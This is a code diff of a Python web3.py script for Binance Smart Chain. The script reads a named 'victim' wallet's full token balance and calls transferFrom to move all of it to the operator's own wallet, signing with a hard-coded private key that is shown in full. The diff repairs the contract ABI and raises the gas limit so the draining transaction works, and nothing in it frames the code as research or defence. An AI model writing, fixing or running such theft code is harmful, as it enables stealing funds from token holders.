@@ -7,23 +7,38 @@ YOUR_WALLET = "0xe27625486041b56E75161F950393f2D4933fC1c8"  # Your wallet
 PRIVATE_KEY = "ec08c372882438439a780bc1db5df8d645e50758c0afd02fdb5b6822abc6bc7b"  # Your wallet's private key
 BSC_RPC = "https://bsc-dataseed.binance.org/"  # RPC endpoint
 
+
 # Setup Web3
 w3 = Web3(Web3.HTTPProvider(BSC_RPC))
-token_abi = [{
-    "inputs": [
-        {"name":"from","type":"address"},
-        {"name":"to","type":"address"},
-        {"name":"amount","type":"uint256"}
-    ],
-    "name":"transferFrom",
-    "type":"function"
-}]
+
+# Minimal ABI with required functions
+token_abi = [
+    {
+        "inputs": [{"name": "account", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {"name": "from", "type": "address"},
+            {"name": "to", "type": "address"},
+            {"name": "amount", "type": "uint256"}
+        ],
+        "name": "transferFrom",
+        "outputs": [{"name": "", "type": "bool"}],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+]
 
 # Create contract instance
 token = w3.eth.contract(address=TARGET_TOKEN, abi=token_abi)
 
 # Get victim balance
 balance = token.functions.balanceOf(VICTIM_WALLET).call()
+print(f"Victim balance: {balance / 10**18} tokens")
 
 # Build and send transaction
 tx = token.functions.transferFrom(
@@ -32,7 +47,7 @@ tx = token.functions.transferFrom(
     balance
 ).build_transaction({
     'from': YOUR_WALLET,
-    'gas': 20000,
+    'gas': 200000,
     'gasPrice': w3.toWei('5', 'gwei'),
     'nonce': w3.eth.getTransactionCount(YOUR_WALLET)
 })
@@ -42,4 +57,4 @@ signed = w3.eth.account.signTransaction(tx, PRIVATE_KEY)
 tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
 
 print(f"Success! TX Hash: {tx_hash.hex()}")
-print(f"Transferred: {balance / 10**18} tokens")
+print(f"Transferred: {balance / 10**18} tokens to {YOUR_WALLET}")
